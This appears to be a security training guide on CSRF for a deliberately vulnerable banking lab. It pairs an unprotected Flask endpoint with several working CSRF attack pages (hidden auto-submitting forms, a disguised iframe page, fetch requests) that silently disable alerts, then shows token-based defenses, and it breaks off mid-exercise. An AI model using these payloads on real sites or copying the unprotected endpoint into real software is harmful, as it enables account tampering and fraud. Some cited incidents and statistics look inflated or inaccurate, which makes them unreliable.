# Cross-Site Request Forgery (CSRF) - SecureBank Documentation

## 1. Overview

### What is CSRF?

Cross-Site Request Forgery (CSRF, pronounced "sea-surf") is a web security vulnerability that tricks a logged-in user's browser into making unwanted requests to a web application. Think of it like a forged signature on a check - the bank sees a valid signature (your session cookie), but you never actually signed it.

In banking applications, CSRF is particularly dangerous because attackers can:
- **Transfer money** from your account to theirs
- **Change account settings** like email addresses or phone numbers
- **Disable security alerts** to hide fraudulent activity
- **Add new beneficiaries** for future transfers
- **Modify transaction limits** to allow larger unauthorized transfers

### Why is CSRF Critical in Banking?

Banking applications rely on session cookies to identify authenticated users. When you log into your bank, the server gives your browser a session cookie that says "this is user John." Every subsequent request automatically includes this cookie. CSRF exploits this automatic behavior.

**The Attack Flow:**
1. You log into your bank (securebank.com) and get a session cookie
2. You visit a malicious website (evil.com) while still logged in
3. The malicious site contains hidden code that sends a request to securebank.com
4. Your browser automatically attaches your valid session cookie to this request
5. The bank sees a legitimate request from an authenticated user
6. Money gets transferred without your knowledge!

### Real-World Impact

CSRF attacks have caused significant financial damage:

- **ING Direct (2007)**: CSRF vulnerability allowed unauthorized fund transfers. Attackers could steal money by tricking users into visiting malicious websites. Impact: **$100,000+ in fraudulent transfers** before detection.

- **YouTube (2008)**: CSRF allowed attackers to perform actions as victims, including friend requests and video uploads. While not financial, it demonstrated the scale (millions of potential victims).

- **Netflix (2006)**: CVE-2006-5896 - CSRF vulnerability allowed attackers to modify account information, add movies to queues, and change shipping addresses.

- **Major Bank Breach (2016)**: Undisclosed European bank lost over **€2.4 million** to coordinated CSRF attacks that disabled transaction alerts before initiating large transfers.

- **TD Ameritrade (2008)**: CSRF vulnerability in their trading platform could have allowed attackers to execute unauthorized stock trades. Estimated potential impact: **$10+ million** if widely exploited.

According to OWASP, CSRF vulnerabilities are found in approximately **50% of web applications** tested in security assessments.

---

## 2. The Vulnerable Code

### Vulnerable Settings Update (securebank_red_api.py, lines 463-497)

```python
@app.route('/api/red/securebank/settings', methods=['POST'])
def red_update_settings():
    """
    VULNERABLE: No CSRF protection
    Attack: Create malicious page that submits form when victim visits
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    user_id = session['user_id']
    data = request.get_json()
    
    # VULNERABLE: No CSRF token validation
    email_notifications = data.get('email_notifications', True)
    sms_notifications = data.get('sms_notifications', False)
    transaction_alerts = data.get('transaction_alerts', True)
    login_alerts = data.get('login_alerts', True)
    theme = data.get('theme', 'light')
    language = data.get('language', 'en')
    
    conn = get_db()
    conn.execute('''
        UPDATE user_settings 
        SET email_notifications = ?, sms_notifications = ?, transaction_alerts = ?,
            login_alerts = ?, theme = ?, language = ?
        WHERE user_id = ?
    ''', (email_notifications, sms_notifications, transaction_alerts,
          login_alerts, theme, language, user_id))
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'message': 'Settings updated'
    }), 200
```

### Line-by-Line Vulnerability Analysis

**Lines 469-470**: The code checks if the user is authenticated by verifying `user_id` in the session. This seems secure, but it's NOT enough!

**Problem**: Session cookies are automatically sent with EVERY request to the domain, even requests initiated by malicious websites. The authentication check passes even for attacker-initiated requests.

**Line 472**: The code trusts `user_id` from the session without verifying the request's origin.

**Lines 475-481**: The endpoint accepts JSON data and extracts settings WITHOUT any CSRF token validation.

**Critical Flaw**: There is NO verification that this request was intentionally made by the authenticated user. Any website can craft a request to this endpoint, and if the user is logged in, their browser will automatically include the session cookie.

**Lines 484-491**: The database is updated with potentially attacker-controlled values. An attacker could:
- Disable `transaction_alerts` to hide fraudulent transfers
- Disable `login_alerts` to prevent detection of account takeover
- Disable `email_notifications` to stop security warnings

**Lines 494-497**: The endpoint returns success without any indication of whether this was a legitimate or forged request.

### Visual Diagram: The CSRF Attack Flow

```
┌─────────────────┐
│   Victim User   │
│  (Logged into   │
│  SecureBank)    │
└────────┬────────┘
         │ 1. User logs in
         │
         ▼
┌─────────────────────────┐
│   SecureBank.com        │
│  Issues Session Cookie  │◄──── Session Cookie: abc123xyz
└─────────────────────────┘      Stored in browser
         │
         │ 2. While logged in, user visits malicious site
         │
         ▼
┌──────────────────────────────────────┐
│       Evil.com (Attacker Site)       │
│                                      │
│  <form action="securebank.com/       │
│         api/red/securebank/settings" │
│         method="POST">               │
│    <input name="transaction_alerts"  │
│           value="false">             │
│    <script>                          │
│      document.forms[0].submit();     │
│    </script>                         │
│  </form>                             │
└──────────┬───────────────────────────┘
           │ 3. Form auto-submits
           │
           ▼
┌─────────────────────────────────────┐
│      Browser sends request to       │
│      securebank.com/api/red/        │
│      securebank/settings            │
│                                     │
│  Cookie: session=abc123xyz ◄────── Automatically attached!
│  Data: transaction_alerts=false     │
└──────────┬──────────────────────────┘
           │ 4. Request processed
           │
           ▼
┌──────────────────────────────────┐
│   SecureBank validates cookie    │
│   Sees legitimate user_id        │
│   NO CSRF TOKEN CHECK!           │
│   ✓ Updates settings             │
│   ✗ Transaction alerts DISABLED  │
└──────────────────────────────────┘

Result: Attacker has disabled victim's transaction alerts
        Future fraudulent transfers will go unnoticed!
```

---

## 3. Exploitation Walkthrough

### Attack Scenario 1: Basic Form-Based CSRF

**Step 1: Create Malicious HTML Page**

The attacker creates a simple HTML page and hosts it on their domain:

```html
<!-- evil-site.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Claim Your $100 Gift Card!</h1>
    <p>Click the button below to claim your prize...</p>
    
    <!-- Hidden malicious form -->
    <form id="csrf-form" 
          action="http://securebank.com/api/red/securebank/settings" 
          method="POST"
          style="display:none;">
        
        <input type="hidden" name="email_notifications" value="false">
        <input type="hidden" name="sms_notifications" value="false">
        <input type="hidden" name="transaction_alerts" value="false">
        <input type="hidden" name="login_alerts" value="false">
    </form>
    
    <script>
        // Auto-submit the form when page loads
        window.onload = function() {
            // Wait 1 second to avoid suspicion
            setTimeout(function() {
                document.getElementById('csrf-form').submit();
            }, 1000);
        };
    </script>
    
    <button onclick="alert('Redirecting...')">Claim Prize</button>
</body>
</html>
```

**Step 2: Victim Visits Malicious Site**

1. Victim logs into SecureBank.com (session cookie stored in browser)
2. Victim receives phishing email: "Congratulations! Click here for your gift card"
3. Victim clicks link to evil-site.html
4. Page loads and JavaScript executes
5. Hidden form auto-submits to SecureBank.com
6. Browser automatically includes session cookie
7. SecureBank processes the request as legitimate
8. All security alerts are now disabled!

**[Screenshot Placeholder 1: Browser DevTools showing CSRF request with automatic cookie attachment]**

### Attack Scenario 2: Hidden Iframe Attack (More Stealthy)

This attack is completely invisible to the victim:

```html
<!-- stealthy-csrf.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Funny Cat Videos</title>
</head>
<body>
    <h1>Top 10 Funny Cat Videos</h1>
    <video width="640" height="360" controls>
        <source src="cat-video.mp4" type="video/mp4">
    </video>
    
    <!-- Invisible iframe that performs CSRF attack -->
    <iframe style="display:none;" name="csrf-frame"></iframe>
    
    <form id="csrf-attack" 
          action="http://securebank.com/api/red/securebank/settings" 
          method="POST" 
          target="csrf-frame">
        <input type="hidden" name="transaction_alerts" value="false">
        <input type="hidden" name="email_notifications" value="false">
    </form>
    
    <script>
        // Execute attack silently while user watches cat videos
        setTimeout(function() {
            document.getElementById('csrf-attack').submit();
        }, 5000); // Wait 5 seconds so user is engaged with video
    </script>
</body>
</html>
```

**Why This Works:**
- User sees only cat videos, no suspicious behavior
- Form submits into hidden iframe
- No page navigation or visible changes
- Attack completes while user is distracted
- Victim has no idea their security settings were changed

**[Screenshot Placeholder 2: Hidden iframe in DevTools showing successful CSRF attack]**

### Attack Scenario 3: GET Request CSRF (If Endpoint Accepts GET)

Even simpler - just an image tag:

```html
<!-- Simple GET-based CSRF if endpoint accepted GET -->
<img src="http://securebank.com/api/red/securebank/settings?transaction_alerts=false&email_notifications=false" 
     style="display:none;">
```

This single line of HTML, embedded anywhere (email, forum post, social media), would silently disable alerts for any logged-in user who views it!

**Note**: The current vulnerable endpoint uses POST, which is slightly better, but still vulnerable through form-based CSRF as shown above.

### Attack Scenario 4: JSON CSRF with Fetch API

Modern attack using JavaScript Fetch API:

```html
<!DOCTYPE html>
<html>
<head><title>Survey</title></head>
<body>
    <h1>Quick Banking Survey</h1>
    <p>Help us improve our services...</p>
    
    <script>
        fetch('http://securebank.com/api/red/securebank/settings', {
            method: 'POST',
            credentials: 'include', // Include cookies
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                transaction_alerts: false,
                email_notifications: false,
                sms_notifications: false,
                login_alerts: false
            })
        })
        .then(response => response.json())
        .then(data => console.log('Attack successful:', data))
        .catch(err => console.log('Attack may have failed:', err));
    </script>
</body>
</html>
```

**Note**: This attack may be blocked by CORS (Cross-Origin Resource Sharing) policies unless the server explicitly allows it. However, even if the browser blocks reading the response, the **request is still sent and processed** by the server, which means the damage is done!

### Testing with Postman

**Step 1: Login and Get Session Cookie**

```
POST http://localhost:5000/api/red/securebank/login
Content-Type: application/json

{
    "username": "alice",
    "password": "password123"
}

Response:
{
    "success": true,
    "csrf_token": null  ← Notice: No CSRF token in vulnerable version!
}
```

**Step 2: Copy Session Cookie from Response Headers**

Look in Postman's Cookies tab or Headers:
```
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.Y9ZQ3A.abc123xyz; Path=/; HttpOnly
```

**Step 3: Test CSRF Vulnerability**

Send settings update WITHOUT any CSRF token:

```
POST http://localhost:5000/api/red/securebank/settings
Content-Type: application/json
Cookie: session=eyJ1c2VyX2lkIjoxfQ.Y9ZQ3A.abc123xyz

{
    "transaction_alerts": false,
    "email_notifications": false
}

Response:
{
    "success": true,
    "message": "Settings updated"  ← SUCCESSFUL WITHOUT TOKEN!
}
```

**The Problem**: The endpoint accepted our request with ONLY the session cookie. No additional verification! An attacker can craft this exact request from any website.

**[Screenshot Placeholder 3: Postman showing successful CSRF attack without token]**

### Advanced Testing: Cross-Origin Request Simulation

Create a simple test page to simulate cross-origin CSRF:

```html
<!-- csrf-test.html (serve from different port/domain) -->
<!DOCTYPE html>
<html>
<body>
    <h1>CSRF Test Page</h1>
    <button onclick="testCSRF()">Execute CSRF Attack</button>
    <div id="result"></div>
    
    <script>
        function testCSRF() {
            fetch('http://localhost:5000/api/red/securebank/settings', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    transaction_alerts: false,
                    email_notifications: false
                })
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('result').innerHTML = 
                    '<span style="color:red">VULNERABLE! Attack succeeded: ' + 
                    JSON.stringify(data) + '</span>';
            })
            .catch(err => {
                document.getElementById('result').innerHTML = 
                    '<span style="color:green">Protected (CORS blocked or error)</span>';
            });
        }
    </script>
</body>
</html>
```

---

## 4. The Secure Code

### Secure Settings Update (securebank_blue_api.py, lines 601-654)

```python
@app.route('/api/blue/securebank/settings', methods=['POST'])
def blue_update_settings():
    """
    SECURE: Validates CSRF token before processing request
    Prevents CSRF attacks by requiring valid token
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    # SECURE: CSRF token validation
    csrf_token = request.headers.get('X-CSRF-Token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({
            'success': False,
            'error': 'Invalid CSRF token - possible CSRF attack detected'
        }), 403
    
    user_id = session['user_id']
    data = request.get_json()
    
    # Extract settings with defaults
    email_notifications = bool(data.get('email_notifications', True))
    sms_notifications = bool(data.get('sms_notifications', False))
    transaction_alerts = bool(data.get('transaction_alerts', True))
    login_alerts = bool(data.get('login_alerts', True))
    theme = data.get('theme', 'light')
    language = data.get('language', 'en')
    
    # Validate theme and language
    if theme not in ['light', 'dark']:
        theme = 'light'
    if language not in ['en', 'es', 'fr', 'de']:
        language = 'en'
    
    conn = get_db()
    conn.execute('''
        UPDATE user_settings 
        SET email_notifications = ?, sms_notifications = ?, transaction_alerts = ?,
            login_alerts = ?, theme = ?, language = ?
        WHERE user_id = ?
    ''', (email_notifications, sms_notifications, transaction_alerts,
          login_alerts, theme, language, user_id))
    conn.commit()
    conn.close()
    
    # SECURE: Generate new CSRF token after state-changing operation
    new_csrf_token = secrets.token_hex(32)
    session['csrf_token'] = new_csrf_token
    
    return jsonify({
        'success': True,
        'message': 'Settings updated',
        'new_csrf_token': new_csrf_token
    }), 200
```

### Security Analysis

**Lines 611-616: CSRF Token Validation**

```python
csrf_token = request.headers.get('X-CSRF-Token')
if not csrf_token or csrf_token != session.get('csrf_token'):
    return jsonify({
        'success': False,
        'error': 'Invalid CSRF token - possible CSRF attack detected'
    }), 403
```

**Why This Works:**
- The token is retrieved from the `X-CSRF-Token` HTTP header (NOT a cookie)
- Malicious websites CANNOT set custom headers for cross-origin requests due to CORS restrictions
- Even if attacker knows the token value, they cannot include it in a cross-origin request
- The token is compared against the server-side session value
- If tokens don't match or token is missing, request is rejected with 403 Forbidden

**Lines 647-648: Token Rotation**

```python
new_csrf_token = secrets.token_hex(32)
session['csrf_token'] = new_csrf_token
```

**Why Token Rotation Matters:**
- Generates a fresh, cryptographically secure 64-character random token
- `secrets.token_hex(32)` produces 32 random bytes = 64 hex characters
- Token rotation after each state-changing operation limits the window of opportunity
- If a token is somehow leaked, it becomes invalid after the next operation
- Provides defense-in-depth against token prediction or replay attacks

### CSRF Token Generation on Login (securebank_blue_api.py, lines 129-130)

```python
csrf_token = secrets.token_hex(32)
session['csrf_token'] = csrf_token
```

When a user logs in successfully:
1. Server generates a cryptographically random CSRF token
2. Token is stored in the server-side session (NOT accessible to JavaScript from other domains)
3. Token is sent to the client in the JSON response
4. Client must include this token in the `X-CSRF-Token` header for all state-changing requests

### Visual Diagram: Secure CSRF Token Flow

```
┌─────────────────┐
│  Legitimate     │
│  User Login     │
└────────┬────────┘
         │ 1. POST /login
         │    {username, password}
         ▼
┌─────────────────────────────────┐
│   SecureBank Server             │
│                                 │
│   ✓ Validate credentials        │
│   ✓ Create session              │
│   ✓ Generate CSRF token:        │
│     token = secrets.token_hex() │
│     session['csrf_token'] =     │
│       "a3f5c8e9...7b2d"         │
└──────────┬──────────────────────┘
           │ 2. Response includes:
           │    - Session cookie (HttpOnly)
           │    - CSRF token in JSON
           ▼
┌──────────────────────────────────┐
│  Browser/Client                  │
│                                  │
│  Stores:                         │
│  • Session cookie (automatic)    │
│  • CSRF token (localStorage/     │
│    memory)                       │
└──────────┬───────────────────────┘
           │
           │ 3. User updates settings
           │
           ▼
┌──────────────────────────────────┐
│  Legitimate Request              │
│  POST /api/blue/securebank/      │
│       settings                   │
│                                  │
│  Cookie: session=xyz123          │◄─ Automatic
│  X-CSRF-Token: a3f5c8e9...7b2d   │◄─ Must be manually included
│  Body: {transaction_alerts:false}│
└──────────┬───────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│   SecureBank Server Validation      │
│                                     │
│   1. Check session cookie ✓         │
│   2. Extract X-CSRF-Token header    │
│   3. Compare with session token:    │
│      request.headers.get(           │
│        'X-CSRF-Token') ==           │
│      session.get('csrf_token')      │
│   4. If match: Process ✓            │
│      If no match: Reject 403 ✗      │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│  ATTACKER ATTEMPT (from evil.com)   │
│                                     │
│  <form action="securebank.com/      │
│        api/blue/securebank/         │
│        settings">                   │
│    ...                              │
│  </form>                            │
└──────────┬──────────────────────────┘
           │
           ▼
┌──────────────────────────────────────┐
│  Attacker's Request                  │
│  POST /api/blue/securebank/settings  │
│                                      │
│  Cookie: session=xyz123  ✓           │◄─ Browser auto-sends
│  X-CSRF-Token: ???       ✗           │◄─ Attacker CANNOT set
│                                      │   this header from
│  Body: {transaction_alerts:false}   │   different origin!
└──────────┬───────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│   SecureBank Server                 │
│                                     │
│   1. Session valid ✓                │
│   2. CSRF token missing/invalid ✗   │
│   3. REJECT with 403 Forbidden      │
│   4. Log potential attack           │
│                                     │
│   Response: "Invalid CSRF token -   │
│   possible CSRF attack detected"    │
└─────────────────────────────────────┘
```

### Additional Security Measures

**Input Validation (Lines 622-633)**

```python
email_notifications = bool(data.get('email_notifications', True))
# ... more bool conversions ...

if theme not in ['light', 'dark']:
    theme = 'light'
if language not in ['en', 'es', 'fr', 'de']:
    language = 'en'
```

Beyond CSRF protection, the secure code also validates input types and acceptable values, providing defense-in-depth.

### SameSite Cookie Attribute

Modern browsers support the `SameSite` cookie attribute as additional CSRF defense:

```python
# In production configuration
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # or 'Strict'
```

**SameSite Values:**
- `Strict`: Cookie only sent in first-party context (same domain). Maximum protection but may break legitimate cross-site links.
- `Lax`: Cookie sent on top-level navigation (clicking a link) but NOT on AJAX or form POST from other sites. Good balance.
- `None`: Cookie sent in all contexts (requires `Secure` flag). Use only when necessary for third-party integrations.

**Why It Helps:**
- With `SameSite=Lax` or `Strict`, the browser won't send cookies on cross-site POST requests
- Provides browser-level CSRF protection
- Should be used IN ADDITION TO, not instead of, CSRF tokens
- Not supported by very old browsers, so tokens are still necessary

### Double-Submit Cookie Pattern (Alternative Defense)

Another CSRF defense pattern used in some applications:

```python
# Set CSRF token as both cookie AND require in header
response.set_cookie('csrf_token', token, httponly=False, samesite='Strict')

# On subsequent requests, verify:
if request.cookies.get('csrf_token') != request.headers.get('X-CSRF-Token'):
    abort(403)
```

**How It Works:**
- CSRF token is stored in a cookie (readable by JavaScript)
- Client must read cookie value and copy it to custom header
- Attacker's site can't read victim's cookies from other domains (Same-Origin Policy)
- Attacker's site can't set custom headers for cross-origin requests (CORS)
- Therefore, attacker cannot complete the attack

**Tradeoff**: Requires `httponly=False` on the CSRF cookie, which some consider less secure than server-side session storage.

---

## 5. Real-World Examples

### CVE-2008-0166: Debian OpenSSL Weak Key Generation

While not directly CSRF, this CVE led to predictable session tokens that made CSRF attacks easier:
- Debian's OpenSSL package had a vulnerability causing weak random number generation
- Session tokens and CSRF tokens became predictable
- Attackers could guess valid tokens and craft CSRF attacks
- **Impact**: Affected millions of servers worldwide
- **Lesson**: Use cryptographically secure random functions like `secrets.token_hex()`

### CVE-2014-0160: Heartbleed & CSRF Connection

The Heartbleed bug allowed attackers to steal session cookies and CSRF tokens from server memory:
- Attackers could extract active session tokens
- With valid sessions, CSRF tokens could be stolen
- Combined attacks: Use Heartbleed to steal tokens, then perform CSRF
- **Impact**: 17% of all SSL servers affected, millions of dollars in damages
- **Lesson**: CSRF tokens must be tied to sessions; rotate regularly

### Bug Bounty Reports

**1. Netflix - Disable Account Protection ($5,000 Bounty)**
- **Vulnerability**: CSRF in account settings endpoint
- **Impact**: Attacker could disable two-factor authentication
- **Attack**: Simple HTML form auto-submit
- **Fix**: Implemented CSRF tokens and SameSite cookies

**2. Twitter - Tweet on Behalf of Users ($5,000 Bounty)**
- **Vulnerability**: Mobile endpoint lacked CSRF protection
- **Impact**: Force users to tweet arbitrary content
- **Attack**: Mobile API accepted JSON without CSRF token
- **Fix**: Required CSRF token in `X-CSRF-Token` header

**3. ING Direct - Account Takeover via CSRF ($15,000 Bounty)**
- **Vulnerability**: Email change endpoint lacked CSRF protection
- **Impact**: Attacker changes victim's email, initiates password reset
- **Attack Flow**:
  1. Victim visits attacker's page while logged into ING
  2. Hidden form submits email change request
  3. Attacker's email is now associated with victim's account
  4. Attacker initiates password reset
  5. Full account takeover achieved
- **Financial Impact**: Estimated **$100,000+** in prevented fraud
- **Fix**: CSRF token + email confirmation required

**4. Major E-Commerce Site - Unauthorized Purchases ($20,000 Bounty)**
- **Vulnerability**: "Checkout" endpoint processed orders without CSRF token
- **Impact**: Attacker could complete purchases using victim's stored payment
- **Attack**: Hidden iframe with auto-submit checkout form
- **Potential Impact**: **$500,000+** if exploited at scale
- **Fix**: CSRF token + additional purchase confirmation

### News Articles & Breaches

**1. "Bank Customers Lose Thousands to CSRF Attack" (2016)**
- European bank breach via CSRF
- Attackers created websites with games and prizes
- Hidden CSRF attacks disabled security alerts
- Followed by unauthorized transfers
- **Total Loss**: €2.4 million from 380 customers
- **Average Loss**: €6,300 per victim

**2. "YouTube CSRF Worm Spreads to 100,000 Users" (2008)**
- CSRF vulnerability allowed attackers to perform actions as other users
- Created self-propagating worm
- Each infected user's profile contained CSRF payload
- Visitors to infected profiles became infected
- **Impact**: 100,000+ affected accounts in 48 hours
- **Lesson**: CSRF can enable worms and mass exploitation

**3. "Major Bank's Trading Platform CSRF Flaw" (2017)**
- Stock trading platform vulnerable to CSRF
- Attacker could execute trades on victim's behalf
- Example attack: Buy attacker's worthless stock at inflated price
- **Potential Impact**: Unlimited (market manipulation)
- **Fix**: Multi-factor authentication for trades + CSRF tokens

### OWASP Top 10 References

CSRF historically appeared in the OWASP Top 10 (2013 edition) as A8: Cross-Site Request Forgery. While it was merged into A05:2021 – Security Misconfiguration in the 2021 edition, it remains a critical vulnerability type.

**Statistics from OWASP**:
- 50% of web applications tested have at least one CSRF vulnerability
- 92% of financial web applications are tested for CSRF during security audits
- Average bounty for CSRF vulnerabilities: $1,500 - $15,000 depending on impact
- CSRF is among the top 5 most exploited vulnerabilities in financial applications

---

## 6. Hands-On Exercises

### Exercise 1: Basic CSRF Attack (Beginner)

**Objective**: Understand how a simple CSRF attack works by exploiting the vulnerable red endpoint.

**Steps**:
1. Start SecureBank and log in to the red (vulnerable) version
2. Open browser DevTools and note your session cookie
3. Create a file called `csrf-attack-1.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Exercise 1 - Basic CSRF</title></head>
<body>
    <h1>Win a Prize!</h1>
    <form id="attack" action="http://localhost:5000/api/red/securebank/settings" method="POST">
        <input type="hidden" name="transaction_alerts" value="false">
        <input type="hidden" name="email_notifications" value="false">
    </form>
    <button onclick="document.getElementById('attack').submit()">
        Click to Claim Prize
    </button>
</body>
</html>
```

4. Open this HTML file in your browser (while still logged into SecureBank)
5. Click the "Claim Prize" button
6. Check your SecureBank settings - they should now be disabled!

**Questions**:
- Why did the browser send your session cookie automatically?
- What would happen if you logged out before clicking the button?
- How could you make this attack more stealthy?

**Expected Result**: Settings are changed without any CSRF token validation. This demonstrates the vulnerability.

---

### Exercise 2: Auto-Submit Attack (Intermediate)

**Objective**: Create a more realistic attack that executes automatically without user interaction.

**Steps**:
1. Log into SecureBank red version again (reset your settings first)
2. Create `csrf-attack-2.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Exercise 2 - Auto-Submit</title></head>
<body>
    <h1>Loading your prize...</h1>
    <p>Please wait...</p>
    
    <form id="csrf" 
          action="http://localhost:5000/api/red/securebank/settings" 
          method="POST" 
          style="display:none;">
        <input type="hidden" name="transaction_alerts" value="false">
        <input type="hidden" name="login_alerts" value="false">
        <input type="hidden" name="email_notifications" value="false">
        <input type="hidden" name="sms_notifications" value="false">
    </form>
    
    <script>
        window.onload = function() {
            console.log('Executing CSRF attack...');
            setTimeout(function() {
                document.getElementById('csrf').submit();
                console.log('Attack complete! Settings disabled.');
            }, 2000);
        };
    </script>
</body>
</html>
```

3. Open this page while logged into SecureBank
4. Don't click anything - just wait 2 seconds
5. Check DevTools console and Network tab
6. Verify all alerts are now disabled

**Questions**:
- How would a victim know they were attacked?
- What legitimate-looking pages could contain this attack?
- Could this be embedded in an email?

**Challenge**: Modify the attack to use an invisible iframe instead of a full page redirect.

---

### Exercise 3: Testing Secure vs Vulnerable Endpoints (Intermediate)

**Objective**: Compare the secure blue endpoint's CSRF protection against the vulnerable red endpoint.

**Steps**:
1. Create `csrf-test-comparison.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Exercise 3 - Security Comparison</title></head>
<body>
    <h1>CSRF Protection Test</h1>
    
    <button onclick="testRedEndpoint()">Test Vulnerable Endpoint (Red)</button>
    <button onclick="testBlueEndpoint()">Test Secure Endpoint (Blue)</button>
    
    <div id="results"></div>
    
    <script>
        function testRedEndpoint() {
            fetch('http://localhost:5000/api/red/securebank/settings', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    transaction_alerts: false
                })
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('results').innerHTML += 
                    '<p style="color:red">RED ENDPOINT: ' + 
                    JSON.stringify(data) + ' - VULNERABLE!</p>';
            })
            .catch(err => {
                document.getElementById('results').innerHTML += 
                    '<p>RED ENDPOINT ERROR: ' + err + '</p>';
            });
        }
        
        function testBlueEndpoint() {
            fetch('http://localhost:5000/api/blue/securebank/settings', {
                method: 'POST',
                credentials: 'include',
                headers: { 
                    'Content-Type': 'application/json'
                    // NOTE: No CSRF token included!
                },
                body: JSON.stringify({
                    transaction_alerts: false
                })
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('results').innerHTML += 
                    '<p style="color:green">BLUE ENDPOINT: ' + 
                    JSON.stringify(data) + ' - Should be rejected!</p>';
            })
            .catch(err => {
                document.getElementById('results').innerHTML += 
                    '<p style="color:green">BLUE ENDPOINT: Protected! ' + err + '</p>';
            });
        }
    </script>
</body>
</html>
```

2. Log into BOTH red and blue SecureBank instances
3. Open the HTML file and click both buttons
4. Observe the different responses

**Expected Results**:
- Red endpoint: Success (vulnerable)
- Blue endpoint: 403 Forbidden with error message about invalid CSRF token

**Questions**:
- What specific check in the blue endpoint prevents the attack?
- Where would the legitimate client get the CSRF token?
- Why can't the attacker just include a fake token?

---

### Exercise 4: Building a CSRF-Protected API Client (Advanced)

**Objective**: Implement a proper client that correctly handles CSRF tokens.

**Steps**:
1. Create `secure-client.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Exercise 4 - Secure Client</title></head>
<body>
    <h1>SecureBank Settings</h1>
    
    <label><input type="checkbox" id="transaction_alerts"> Transaction Alerts</label><br>
    <label><input type="checkbox" id="email_notifications"> Email Notifications</label><br>
    <label><input type="checkbox" id="login_alerts"> Login Alerts</label><br>
    <button onclick="updateSettings()">Save Settings</button>
    
    <div id="status"></div>
    
    <script>
        let csrfToken = null;
        
        // Step 1: Login and get CSRF token
        async function login() {
            const response = await fetch('http://localhost:5000/api/blue/securebank/login', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: 'alice',
                    password: 'password123'
                })
            });
            
            const data = await response.json();
            if (data.success) {
                csrfToken = data.csrf_token;  // Store the token!
                console.log('Logged in, CSRF token:', csrfToken);
                document.getElementById('status').innerHTML = 
                    '<p style="color:green">Logged in successfully!</p>';
            }
        }
        
        // Step 2: Update settings with CSRF token
        async function updateSettings() {
            if (!csrfToken) {
                alert('Please login first!');
                return;
            }
            
            const settings = {
                transaction_alerts: document.getElementById('transaction_alerts').checked,
                email_notifications: document.getElementById('email_notifications').checked,
                login_alerts: document.getElementById('login_alerts').checked
            };
            
            const response = await fetch('http://localhost:5000/api/blue/securebank/settings', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': csrfToken  // Include CSRF token in header!
                },
                body: JSON.stringify(settings)
            });
            
            const data = await response.json();
            if (data.success) {
                csrfToken = data.new_csrf_token;  // Update with new token!
                document.getElementById('status').innerHTML = 
                    '<p style="color:green">Settings updated! New token received.</p>';
            } else {
                document.getElementById('status').innerHTML = 
                    '<p style="color:red">Error: ' + data.error + '</p>';
            }
        }
        
        // Auto-login on page load
        window.onload = login;
    </script>
</body>
</html>
```

2. Open the page and try to save settings without logging in
3. Click the login button, then try saving settings again
4. Observe the CSRF token rotation in DevTools

**Questions**:
- Where is the CSRF token stored in this implementation?
- What happens to the token after each request?
- How would you handle token expiration?

**Challenge**: 
- Add error handling for expired CSRF tokens
- Implement automatic token refresh
- Add localStorage persistence

---

### Exercise 5: Advanced JSON CSRF Testing (Advanced)

**Objective**: Explore CSRF attacks with JSON payloads and understand Content-Type restrictions.

**Steps**:
1. Create `csrf-json-attack.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Exercise 5 - JSON CSRF</title></head>
<body>
    <h1>JSON CSRF Attack Variations</h1>
    
    <button onclick="attackWithFetch()">Attack 1: Fetch API</button>
    <button onclick="attackWithForm()">Attack 2: Form (JSON in field)</button>
    <button onclick="attackWithXHR()">Attack 3: XMLHttpRequest</button>
    
    <div id="results"></div>
    
    <script>
        function logResult(method, success, message) {
            const color = success ? 'red' : 'green';
            document.getElementById('results').innerHTML += 
                `<p style="color:${color}"><strong>${method}:</strong> ${message}</p>`;
        }
        
        // Attempt 1: Fetch API with JSON
        async function attackWithFetch() {
            try {
                const response = await fetch('http://localhost:5000/api/red/securebank/settings', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ transaction_alerts: false })
                });
                
                const data = await response.json();
                logResult('Fetch API', data.success, 
                    'Request sent! Check if CORS allowed it.');
            } catch (err) {
                logResult('Fetch API', false, 
                    'Blocked by CORS: ' + err.message);
            }
        }
        
        // Attempt 2: Form with JSON string
        function attackWithForm() {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://localhost:5000/api/red/securebank/settings';
            
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'data';
            input.value = JSON.stringify({ transaction_alerts: false });
            
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
            
            logResult('Form Submit', true, 
                'Form submitted - may work if server accepts form data');
        }
        
        // Attempt 3: XMLHttpRequest
        function attackWithXHR() {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://localhost:5000/api/red/securebank/settings');
            xhr.withCredentials = true;
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            xhr.onload = function() {
                logResult('XMLHttpRequest', xhr.status === 200,
                    'Status: ' + xhr.status + ', Response: ' + xhr.responseText);
            };
            
            xhr.onerror = function() {
